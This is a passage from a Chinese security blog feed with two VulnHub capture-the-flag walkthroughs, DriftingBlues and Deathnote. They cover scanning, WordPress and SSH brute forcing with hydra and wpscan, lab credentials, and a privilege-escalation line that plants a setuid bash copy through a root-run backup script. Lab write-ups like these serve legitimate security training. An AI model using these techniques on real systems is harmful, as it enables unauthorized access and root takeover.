alt="image-20240204195833130"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">靶场真实ip地址为<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.6</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="2.探测端口及服务"></a>2.探测端口及服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.1.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204200036360.png" alt="image-20240204200036360"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开启了<span class="token number">22</span>端口，服务为OpenSSH <span class="token number">7</span><span class="token punctuation">.</span>2p2 Ubuntu 4ubuntu2<span class="token punctuation">.</span><span class="token number">10</span> <span class="token punctuation">(</span>Ubuntu Linux; protocol <span class="token number">2.0</span><span class="token punctuation">)</span>发现开启了<span class="token number">80</span>端口，服务为Apache httpd <span class="token number">2.4</span><span class="token number">.18</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="3.web指纹识别"></a>3.web指纹识别</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">whatweb <span class="token parameter variable">-v</span> http://192.168.1.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204200253063.png" alt="image-20240204200253063"></p><h1 id="三-渗透测试"><a href="#三-渗透测试" class="headerlink" title="三.渗透测试"></a>三.渗透测试</h1><h2 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="1.访问web服务"></a>1.访问web服务</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204200348375.png" alt="image-20240204200348375"></p><h2 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="2.扫描web服务"></a>2.扫描web服务</h2><h3 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.1.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204200501925.png" alt="image-20240204200501925"></p><p>没有信息</p><h3 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.1.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204200635070.png" alt="image-20240204200635070"></p><h3 id="3-disearch目录扫描"><a href="#3-disearch目录扫描" class="headerlink" title="3)disearch目录扫描"></a>3)disearch目录扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.1.6 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204200950837.png" alt="image-20240204200950837"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204200931801.png" alt="image-20240204200931801"></p><p>截止到目前，我们没有扫描到如何有用的信息，我们想想还有什么办法，突然想到源代码我们没有查看，我们进行查看</p><h3 id="4-查看源代码"><a href="#4-查看源代码" class="headerlink" title="4)查看源代码"></a>4)查看源代码</h3><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204201131720.png" alt="image-20240204201131720"></p><p>我们找了很久，找到一个base64编码，我们进行解密</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204201440212.png" alt="image-20240204201440212"></p><p>解密之后，是一个目录</p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问目录"><a href="#1-访问目录" class="headerlink" title="1)访问目录"></a>1)访问目录</h3><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.1.6&#x2F;noteforkingfish.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204201835321.png" alt="image-20240204201835321"></p><h3 id="2-解密"><a href="#2-解密" class="headerlink" title="2)解密"></a>2)解密</h3><p>我们看到是一个Ook编码，我们进行解密</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204202328901.png" alt="image-20240204202328901"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204202358528.png" alt="image-20240204202358528"></p><p>提示我们修改主机文件，那么我们进行修改</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204202442278.png" alt="image-20240204202442278"></p><h3 id="3-修改主机文件"><a href="#3-修改主机文件" class="headerlink" title="3)修改主机文件"></a>3)修改主机文件</h3><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204202636502.png" alt="image-20240204202636502"></p><p>然后我们进行扫描域名</p><h3 id="4-gobuster扫描"><a href="#4-gobuster扫描" class="headerlink" title="4)gobuster扫描"></a>4)gobuster扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster vhost <span class="token parameter variable">-u</span> driftingblues.box <span class="token parameter variable">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204215145797.png" alt="image-20240204215145797"></p><p> 重新修改&#x2F;etc&#x2F;hosts，添加为192.168.1.6 test.driftingblues.box，然后再后访问test.driftingblues.box</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204215411095.png" alt="image-20240204215411095"></p><p>我们进行访问</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;test.driftingblues.box&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204215534082.png" alt="image-20240204215534082"></p><p>扫描到一个eric，我们先记一下</p><h3 id="5-dirsearch扫描域名"><a href="#5-dirsearch扫描域名" class="headerlink" title="5)dirsearch扫描域名"></a>5)dirsearch扫描域名</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> dirsearch <span class="token parameter variable">-u</span> http://test.driftingblues.box/ <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent   <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204215950863.png" alt="image-20240204215950863"></p><p>我们进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204220019202.png" alt="image-20240204220019202"></p><h3 id="6-robots-txt"><a href="#6-robots-txt" class="headerlink" title="6)robots.txt"></a>6)robots.txt</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://test.driftingblues.box/ssh_cred.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204220104846.png" alt="image-20240204220104846"></p><p>可能跟ssh登录有关系，果然是ssh登录的密码，不过末尾有数字，其他的都是404</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204220202624.png" alt="image-20240204220202624"></p><p>发现这里有个提示：这个的密码需要最后一位加一个数字才是正真的密码 这样的话就有十种可能 所以自己自定义个字典 把十种可能写进去</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204220545518.png" alt="image-20240204220545518"></p><p>既然说了是ssh登录的密码，那么我们就进行暴力破解</p><h3 id="7-hydra暴力破解"><a href="#7-hydra暴力破解" class="headerlink" title="7)hydra暴力破解"></a>7)hydra暴力破解</h3><p>猜测刚刚的提示 账号是 eric使用工具hydra尝试暴力破解，得到密码为：1mw4ckyyucky6 使用ssh 登入即可</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-l</span> eric <span class="token parameter variable">-P</span> <span class="token string">'/home/kali/桌面/MS02423.txt'</span>  <span class="token parameter variable">-v</span> <span class="token number">192.168</span>.1.6 <span class="token function">ssh</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204220902417.png" alt="image-20240204220902417"></p><p>我们看到爆破成功，我们进行登录</p><h3 id="8-ssh登录"><a href="#8-ssh登录" class="headerlink" title="8)ssh登录"></a>8)ssh登录</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> eric@192.168.1.6 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204221032399.png" alt="image-20240204221032399"></p><h3 id="9-提权"><a href="#9-提权" class="headerlink" title="9)提权"></a>9)提权</h3><pre class="line-numbers language-none"><code class="language-none">sudo -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204221247919.png" alt="image-20240204221247919"></p><p>我们发现不行，我们查看根目录下的内容</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204221408468.png" alt="image-20240204221408468"></p><p>我们找到了第一个flag</p><p>到这里，就没有思路了，但是一般情况下，我们会查看的几个目录:home,tmp,&#x2F;var&#x2F;www&#x2F;html&#x2F;,var</p><p>我们一个一个进行查看，在&#x2F;var&#x2F;里面发现了backups</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204222115648.png" alt="image-20240204222115648"></p><p>我们进行查看,在&#x2F;var&#x2F;backups这个备份文件夹中找到一个.sh脚本文件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204222213298.png" alt="image-20240204222213298"></p><p>backup.sh的内容就是用zip命令把&#x2F;var&#x2F;www目录下的所有内容打包为&#x2F;tmp&#x2F;backup.zip，然后sudo &#x2F;tmp&#x2F;emergency,在前面&#x2F;tmp中找到了这个压缩文件，但是并没有找到emergency文件,需要创建emergency文件，并将eric用户加入sudo组</p><pre class="line-numbers language-none"><code class="language-none">echo &#39;cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;getroot; chmod +s &#x2F;tmp&#x2F;getroot&#39; &gt; &#x2F;tmp&#x2F;emergencychmod +x emergency .&#x2F;getroot -p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204222747642.png" alt="image-20240204222747642"></p><p>我们查看flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204222837963.png" alt="image-20240204222837963"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240204222856899.png" alt="image-20240204222856899"></p><h1 id="四-相关知识"><a href="#四-相关知识" class="headerlink" title="四.相关知识"></a>四.相关知识</h1><p>1.靶场下载地址 </p><p>2.nmap</p><p>3.arp-scan </p><p>4.masscan </p><p>5.[ 常用工具篇 ] 渗透神器 whatweb 安装使用详解 </p><p>6.[ 渗透工具篇 ] EHole(棱洞)3.0安装部署及详解（linux &amp; win） </p><p>7.nikto工具的使用</p><p>8.dirsearch目录扫描</p><p>9.ssh登录</p><p>10.hydra——密码暴利破解工具Hydra</p><p>11.ook解密: Brainfuck&#x2F;OoK加密解密</p><p>12.gobuster扫描</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之Deathnote</title>
    <link href="http://ms02423.top/2024/02/01/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDeathnote/"/>
    <id>http://ms02423.top/2024/02/01/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDeathnote/</id>
    <published>2024-02-01T11:31:56.000Z</published>
    <updated>2024-02-03T13:30:23.779Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Level <span class="token operator">-</span> easyDescription <span class="token punctuation">:</span> don't waste too much <span class="token keyword">time</span> thinking outside the box <span class="token punctuation">.</span> It <span class="token keyword">is</span> a Straight forward box <span class="token punctuation">.</span>This works better <span class="token keyword">with</span> VirtualBox rather <span class="token operator">than</span> VMware <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="2-靶场下载"><a href="#2-靶场下载" class="headerlink" title="2.靶场下载"></a>2.靶场下载</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>deathnote-1<span class="token punctuation">,</span><span class="token number">739</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203192901876.png" alt="image-20240203192901876"></p><h2 id="3-启动环境"><a href="#3-启动环境" class="headerlink" title="3.启动环境"></a>3.启动环境</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203192942140.png" alt="image-20240203192942140"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.1.0&#x2F;24</p><h1 id="二-信息收集"><a href="#二-信息收集" class="headerlink" title="二.信息收集"></a>二.信息收集</h1><h2 id="1-探测靶场真实ip"><a href="#1-探测靶场真实ip" class="headerlink" title="1.探测靶场真实ip"></a>1.探测靶场真实ip</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.1.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203193400563.png" alt="image-20240203193400563"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203193446481.png" alt="image-20240203193446481"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">靶场的真实ip地址为<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.60</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="2.探测端口及服务"></a>2.探测端口及服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.1.60<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203193648881.png" alt="image-20240203193648881"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开放了<span class="token number">22</span>端口，服务为OpenSSH <span class="token number">7</span><span class="token punctuation">.</span>9p1 Debian <span class="token number">10</span><span class="token operator">+</span>deb10u2 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>发现开放了<span class="token number">80</span>端口，服务为 Apache httpd <span class="token number">2.4</span><span class="token number">.38</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Debian<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="3.web指纹识别"></a>3.web指纹识别</h2><pre class="line-numbers language-none"><code class="language-none">whatweb -v http:&#x2F;&#x2F;192.168.1.60<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203194408934.png" alt="image-20240203194408934"></p><h1 id="三-渗透测试"><a href="#三-渗透测试" class="headerlink" title="三.渗透测试"></a>三.渗透测试</h1><h2 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="1.访问web服务"></a>1.访问web服务</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.60<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203194656963.png" alt="image-20240203194656963"></p><p>我们可以看到报错了,那是因为ip和域名没有进行绑定，我们进行绑定</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/hosts<span class="token number">192.168</span>.1.60     deathnote.vuln<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203194855420.png" alt="image-20240203194855420"></p><p>我们再次进行访问，发现可以正常访问了</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203194951224.png" alt="image-20240203194951224"></p><h2 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="2.扫描web服务"></a>2.扫描web服务</h2><h3 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.1.60<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203195332028.png" alt="image-20240203195332028"></p><p>没有有用信息</p><h3 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.1.60<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203195901560.png" alt="image-20240203195901560"></p><p>我们扫描到2个网站，我们一个一个进行访问</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.60/wordpress/wp-login.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203195646656.png" alt="image-20240203195646656"></p><p>我们发现是一个登录页面,但是我们并不知道用户名和密码</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.60/wordpress/wp-content/uploads/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203195940033.png" alt="image-20240203195940033"></p><p>发现了一个上传文件的路径uploads,这些都先放放</p><h3 id="3-dirsearch目录扫描"><a href="#3-dirsearch目录扫描" class="headerlink" title="3)dirsearch目录扫描"></a>3)dirsearch目录扫描</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.1.60 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203200615930.png" alt="image-20240203200615930"></p><p>我们查看robots.txt</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203200652733.png" alt="image-20240203200652733"></p><p>说在important.jpg添加了提示，之后可以看看</p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-爆破用户名和密码"><a href="#1-爆破用户名和密码" class="headerlink" title="1)爆破用户名和密码"></a>1)爆破用户名和密码</h3><p>我们可以看到框架是wordpress，我们可以使用Wpscan进行爆破</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">获取用户名wpscan <span class="token parameter variable">--url</span> http://deathnote.vuln/wordpress/ <span class="token parameter variable">-e</span> u<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203201324673.png" alt="image-20240203201324673"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203201349683.png" alt="image-20240203201349683"></p><p>爆破出来用户名是Kira</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">通过cewl生成字典cewl http://deathnote.vuln/wordpress/ <span class="token operator">></span>  MS02423.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203201741460.png" alt="image-20240203201741460"></p><p>我们查看子典</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203201820551.png" alt="image-20240203201820551"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan <span class="token parameter variable">--url</span> http://deathnote.vuln/wordpress kira <span class="token parameter variable">-P</span> MS02423.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203202024273.png" alt="image-20240203202024273"></p><p>没有爆破成功</p><h3 id="2-查看提示"><a href="#2-查看提示" class="headerlink" title="2)查看提示"></a>2)查看提示</h3><p>我们前面还扫描到一个上传文件的路径uploads，我们进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203202248574.png" alt="image-20240203202248574"></p><p>在这个界面中看看有没有线索，打开2021&#x2F;07，发现了两个关键文件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203202313430.png" alt="image-20240203202313430"></p><p>打开这两个文档，发现是用户名和密码的字典，我们再次进行爆破</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> wpscan <span class="token parameter variable">--url</span> http://deathnote.vuln/wordpress/ <span class="token parameter variable">-U</span> user.txt <span class="token parameter variable">-P</span> MS02423.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203202931270.png" alt="image-20240203202931270"></p><p>还是没有爆破成功，我们换一个思路</p><p>现在我们知道用户名，不知道密码，我们前面扫描到robots.txt，有一个提示说在important.jpg添加了提示，那么我们就在网站图片上面找</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203203241394.png" alt="image-20240203203241394"></p><p>我们发现了用户名，在找找看有没有密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203203352628.png" alt="image-20240203203352628"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203203424270.png" alt="image-20240203203424270"></p><p>我们发现 iamjustic3出现了2次，我们可以试试</p><h3 id="3-登录页面"><a href="#3-登录页面" class="headerlink" title="3)登录页面"></a>3)登录页面</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">kiraiamjustic3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203203612607.png" alt="image-20240203203612607"></p><p>我们可以看到登录成功，我们进行查看，看有没有可以利用的地方</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://deathnote.vuln/wordpress/wp-admin/upload.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203204005226.png" alt="image-20240203204005226"></p><p>我们发现了一个notes.txt文件，进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203204152047.png" alt="image-20240203204152047"></p><p>发现了文件的路径获得密码字典,那么肯定是有用的，我们想到22端口是开放的，我们可以试试爆破ssh</p><h3 id="4-爆破ssh"><a href="#4-爆破ssh" class="headerlink" title="4)爆破ssh"></a>4)爆破ssh</h3><pre class="line-numbers language-none"><code class="language-none">hydra -L user.txt -P MS02423.txt ssh:&#x2F;&#x2F;192.168.1.60<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203204929285.png" alt="image-20240203204929285"></p><p>爆破出来用户名和密码,我们进行登录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> l@192.168.1.60<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203205140057.png" alt="image-20240203205140057"></p><p>登录成功</p><h3 id="5-提权"><a href="#5-提权" class="headerlink" title="5)提权"></a>5)提权</h3><p>我们查看提权方式，发现没有</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203205322795.png" alt="image-20240203205322795"></p><p>我们查看根目录下的内容，发现了user.txt文件，我们进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203205509799.png" alt="image-20240203205509799"></p><p>我们发现是Brainfuck&#x2F;OoK加密，我们进行解密</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203205627947.png" alt="image-20240203205627947"></p><p>没有什么用</p><p>继续看看能不能发现什么，L是一个关键人物</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-name</span> L <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行find命令时可能输出大量无权限的内容，2&gt;&#x2F;dev&#x2F;null 把错误输出到“黑洞”，只输出有权限能查看到文件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203205913819.png" alt="image-20240203205913819"></p><p>我们进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203210005791.png" alt="image-20240203210005791"></p><p>我们发现了fake-notebook-rule和kira-case文件</p><p>首先，我们进入fake-notebook-rule，发现了2个文件，一个是加密的数字，一个是提示</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203210221121.png" alt="image-20240203210221121"></p><p>我们进行解密</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203211513146.png" alt="image-20240203211513146"></p><p>我们发现是base64，我们进行解密</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203211550724.png" alt="image-20240203211550724"></p><p>得到密码是kiraisevil，猜测是kira用户的密码</p><p>我们进行登录，su kira</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203212100764.png" alt="image-20240203212100764"></p><p>sudo su</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240203212150597.png" alt="image-20240203212150597"></p><p>我们成功查看到flag</p><h1 id="四-相关知识"><a href="#四-相关知识" class="headerlink" title="四.相关知识"></a>四.相关知识</h1><p>1.靶场下载地址 </p><p>2.nmap</p><p>3.arp-scan </p><p>4.masscan </p><p>5.[ 常用工具篇 ] 渗透神器 whatweb 安装使用详解 </p><p>6.[ 渗透工具篇 ] EHole(棱洞)3.0安装部署及详解（linux &amp; win） </p><p>7.nikto工具的使用</p><p>8.dirsearch目录扫描</p><p>9.wpscan爆破</p><p>10.ssh登录</p><p>11.cewl——kali密码攻击工具</p><p>12.hydra——密码暴利破解工具Hydra</p><p>13.ook解密: Brainfuck&#x2F;OoK加密解密</p><p>14.cyberchef</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之doubletrouble</title>
    <link href="http://ms02423.top/2024/01/31/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8Bdoubletrouble/"/>
    <id>http://ms02423.top/2024/01/31/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8Bdoubletrouble/</id>
    <published>2024-01-31T12:03:10.000Z</published>
    <updated>2024-02-02T12:09:04.760Z</updated>
    
